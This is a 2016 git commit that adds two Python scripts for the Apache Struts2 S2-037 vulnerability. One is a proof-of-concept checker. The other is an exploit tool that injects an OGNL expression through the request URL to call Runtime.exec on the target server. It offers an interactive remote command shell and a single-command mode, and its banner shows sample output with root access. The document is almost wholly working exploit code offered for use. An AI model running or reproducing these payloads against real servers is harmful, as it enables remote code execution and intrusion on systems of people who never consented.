1c3446548065836f7137a983e480f158a573d3e6
coffeehb <1186439457@qq.com>
2016-06-15 22:56:12 +0800

    添加S2-037的POC和EXP

---
+++ Struts2/S2-037_CmdToolExP.py
@@ -0,0 +1,132 @@
+#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+
+import requests
+import argparse
+
+banner = u'''\
+# S2-037 CmdToolExP
+# Author:CF_HB
+# 时间：2016年6月15日
+# 参考：https://mp.weixin.qq.com/s?__biz=MzAwNTYwMjM3Mw==&mid=2651680334&idx=1&sn=5c9adb02a1c11d9bbff3ffddb639d62f&scene=1&srcid=06155PRaQh7SaMEXd9Gm8hJz&key=18e81ac7415f67c47805fa13645fc0bfbfc346925f00cad995baf01c4d39f50db871ab4deb12eb91e46ff14b0570894a&ascene=0&uin=MTgyMDIxMTIw&devicetype=iMac+MacBookPro12%2C1+OSX+OSX+10.11.5+build(15F34)&version=11020201&pass_ticket=kA0Saphd78eTEUnR4OiUT95KlcsA12Avul8RmKbOClA%3D
+#使用说明：
+# 1、检测
+    python S2-037_CmdToolExP.py -u http://xxx.xxx.xxx.xxx/xx/ -check yes
+  2、交互式执行命令
+    python S2-037_CmdToolExP.py -u http://xxx.xxx.xxx.xxx/xx/ -shell yes
+  3、执行一条命令：在无交互式环境或不方便查看回显数据时使用
+    python S2-037_CmdToolExP.py -u http://xxx.xxx.xxx.xxx/xx/ -command "net user "
+# ~$ id
+# ======================================================
+# uid=0(root) gid=0(root) groups=0(root)
+#
+# ======================================================
+# ~$ pwd
+# ======================================================
+# /
+# ======================================================
+# ~$ q   退出
+
+# ======================================================
+'''
+# PoC
+s2033_poc = "/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F((%23writ%3D(%23attr%5B%23parameters.com%5B0%5D%5D).getWriter())%2C%23writ.println(3345*2356))%3Aindex.xhtml?com=com.opensymphony.xwork2.dispatcher.HttpServletResponse"
+# CommandExP
+cmd_exp = "/(%23mem=%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3f@java.lang.Runtime@getRuntime().exec(%23parameters.cmd):index.xhtml?cmd=ShowMeCommand"
+headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
+            'Cookie': 'JSESSIONID=75C9ED1CD9345875BC5328D73DC76812',
+            'referer': 'http://www.baidu.com/',
+}
+
+def verity(url):
+
+    try:
+        poc_url = url+s2033_poc
+        print "."*len(url)
+        print "[checking] " + url
+        print "."*len(url)
+        s = requests.session()
+        res = s.post(poc_url, timeout=4)
+        if res.status_code == 200 and "7880820" == res.content:
+            return True
+        else:
+            return False
+
+    except Exception, e:
+        print "Failed to connection target, try again.."
+        return False
+
+
+def cmdTool(exp_url):
+
+    get_url_exp = exp_url + cmd_exp
+    while True:
+        comm = raw_input("~$ ")
+        if comm == "q":
+            exit(0)
+        temp_exp = get_url_exp.replace("ShowMeCommand", comm)
+        try:
+            print "="*80
+            print "[Result]"
+            print "_"*80
+            r = requests.get(temp_exp, headers=headers, timeout=5)
+            resp = r.text.encode("utf-8")
+            print resp
+            print "="*80
+        except:
+            print "error,try again.."
+
+# 执行一句话命令
+def ExecOneCmd(exp_url , command):
+    try:
+        get_url_exp = exp_url + cmd_exp
+        temp_exp = get_url_exp.replace("ShowMeCommand", command)
+        print "="*80
+        print "[Result]"
+        print "_"*80
+        r = requests.get(temp_exp, headers=headers, timeout=5)
+        resp = r.text.encode("utf-8")
+        print resp
+        print "="*80
+        return True
+    except:
+        return False
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-u', help='the target url.', required=True)
+    parser.add_argument('-check', help='yes|no', required=False)
+    parser.add_argument('-shell', help='get os shell (yes|no)', required=False)
+    parser.add_argument('-command', help='yes|no', required=False)
+    args = parser.parse_args()
+    args_dict = args.__dict__
+
+    try:
+        print banner
+        if not (args_dict['u'] == None):
+            if not (args_dict['check'] == None):
+                url = args_dict['u']
+                if args_dict['check'] == "yes":
+                    isvuln = verity(url)
+                    if isvuln:
+                        print "{url} is vulnerable S2-037.".format(url=url)
+                        exit(0)
+                    else:
+                        print "{url} is no vulnerable..".format(url=url)
+                        exit(0)
+            if not (args_dict['shell'] == None):
+                if args_dict['shell'] == "yes":
+                    url = args_dict['u']
+                    cmdTool(url)
+                exit(0)
+
+            if not (args_dict['command'] == None):
+                url = args_dict['u']
+                command = args_dict['command']
+                ExecOneCmd(url, command)
+                exit(0)
+
+        print parser.print_usage()
+    except Exception,e:
+        print parser.print_usage()
+        exit(-1)
---
+++ Struts2/S2-037_PoC.py
@@ -0,0 +1,44 @@
+#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+# S2-037 POC
+# Author: CF_HB
+# 时间：2016年6月15日
+
+import requests
+import argparse
+
+banner = u'''\
+# S2-037 POC
+# Author:CF_HB
+# 时间：2016年6月15日
+#使用说明：
+# 1、检测
+    python S2-037_PoC.py -u http://xxx.xxx.xxx.xxx/xx/
+'''
+def verity(url):
+    s2033_poc = "/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F((%23writ%3D(%23attr%5B%23parameters.com%5B0%5D%5D).getWriter())%2C%23writ.println(3345*2356))%3Aindex.xhtml?com=com.opensymphony.xwork2.dispatcher.HttpServletResponse"
+    try:
+        print banner
+        poc_url = url+s2033_poc
+        print "[checking] " + url
+        s = requests.session()
+        res = s.post(poc_url, timeout=4)
+        if res.status_code == 200 and "7880820" == res.content:
+            print "{url} is vulnerable S2-037.".format(url=url)
+        else:
+            print "{url} is no vulnerable..".format(url=url)
+    except Exception, e:
+        print "Failed to connection target, try again.."
+parser = argparse.ArgumentParser()
+parser.add_argument('-u', help='the target url.')
+args = parser.parse_args()
+args_dict = args.__dict__
+
+try:
+    shellpath = None
+    if not (args_dict['u'] == None):
+        url = args_dict['u']
+    verity(url)
+except Exception,e:
+    print parser.print_usage()
+    exit(-1)
